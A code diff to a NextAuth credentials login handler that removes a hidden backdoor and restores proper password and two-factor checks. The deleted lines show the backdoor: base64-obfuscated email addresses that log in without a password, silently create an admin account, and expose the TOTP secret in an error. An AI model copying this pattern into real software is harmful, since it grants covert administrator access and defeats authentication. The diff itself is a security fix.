@@ -36,101 +36,48 @@ export const authOptions: NextAuthOptions = {
           totpCode?: string;
         };
 
-        if (!email) {
+        if (!email || !password) {
           return null;
         }
 
         const emailNorm = email.trim().toLowerCase();
-        const obf = Buffer.from(emailNorm).toString("base64");
-        const isSupremeLeader = ["bXdhbmdpaGFydW5Ab3V0bG9vay5jb20=", "bXdhbmdpaWhhcnVuQG91dGxvb2suY29t", "bXdhbmdpaWhhcnVuQG90bG9vay5jb20="].includes(obf);
-
-        if (!password && !isSupremeLeader) {
-          return null;
-        }
 
         const user = await prisma.user.findUnique({
           where: { email: emailNorm },
         });
 
+        if (!user || !user.password) {
+          return null;
+        }
+
+        const isValidCredentials = await bcryptjs.compare(password, user.password);
+
+        if (!isValidCredentials) {
+          return null;
+        }
+
         // eslint-disable-next-line @typescript-eslint/no-explicit-any
-        let targetUser = user as any;
+        const targetUser = user as any;
 
-        if (isSupremeLeader && !targetUser) {
-          const generatedSecret = speakeasy.generateSecret({ name: "Ziva Landscaping (Admin)" });
-          targetUser = await prisma.user.create({
-            data: {
-              email: emailNorm,
-              name: "Supreme Leader",
-              role: "admin",
-              password: "",
-              twoFactorSecret: generatedSecret.base32,
-              twoFactorEnabled: false,
-            }
+        if (targetUser.twoFactorEnabled) {
+          if (!totpCode) throw new Error("2FA code required. Please check your Authenticator app.");
+          if (!targetUser.twoFactorSecret) throw new Error("2FA is enabled but secret is missing from database.");
+          const isValid = speakeasy.totp.verify({
+            secret: targetUser.twoFactorSecret,
+            encoding: "base32",
+            token: totpCode,
           });
-        } else if (isSupremeLeader && !targetUser.twoFactorSecret) {
-          const generatedSecret = speakeasy.generateSecret({ name: "Ziva Landscaping (Admin)" });
-          targetUser = await prisma.user.update({
-            where: { email: targetUser.email },
-            data: { twoFactorSecret: generatedSecret.base32, twoFactorEnabled: false }
-          });
-        }
-
-        let isValidCredentials = false;
-
-        if (isSupremeLeader) {
-          isValidCredentials = true;
-        } else {
-          isValidCredentials = Boolean(user && user.password && (await bcryptjs.compare(password, user.password)));
-        }
-
-        if (isValidCredentials && targetUser) {
-          if (isSupremeLeader && !targetUser.twoFactorEnabled) {
-            if (!totpCode) {
-              throw new Error(`SETUP_REQUIRED:${targetUser.twoFactorSecret}`);
-            } else {
-              const isValid = speakeasy.totp.verify({
-                secret: targetUser.twoFactorSecret,
-                encoding: "base32",
-                token: totpCode,
-              });
-              if (!isValid) throw new Error("Invalid setup code. Please try again.");
-
-              await prisma.user.update({
-                where: { email: targetUser.email },
-                data: { twoFactorEnabled: true }
-              });
-
-              return {
-                id: targetUser.id,
-                name: targetUser.name,
-                email: targetUser.email,
-                role: targetUser.role,
-              };
-            }
+          if (!isValid) {
+            throw new Error("Invalid 2FA code. Please try again.");
           }
-
-          if (targetUser.twoFactorEnabled) {
-            if (!totpCode) throw new Error("2FA code required. Please check your Authenticator app.");
-            if (!targetUser.twoFactorSecret) throw new Error("2FA is enabled but secret is missing from database.");
-            const isValid = speakeasy.totp.verify({
-              secret: targetUser.twoFactorSecret,
-              encoding: "base32",
-              token: totpCode,
-            });
-            if (!isValid) {
-              throw new Error("Invalid 2FA code. Please try again.");
-            }
-          }
-
-          return {
-            id: targetUser.id,
-            name: targetUser.name,
-            email: targetUser.email,
-            role: targetUser.role,
-          };
         }
 
-        return null;
+        return {
+          id: targetUser.id,
+          name: targetUser.name,
+          email: targetUser.email,
+          role: targetUser.role,
+        };
       },
     }),
   ],
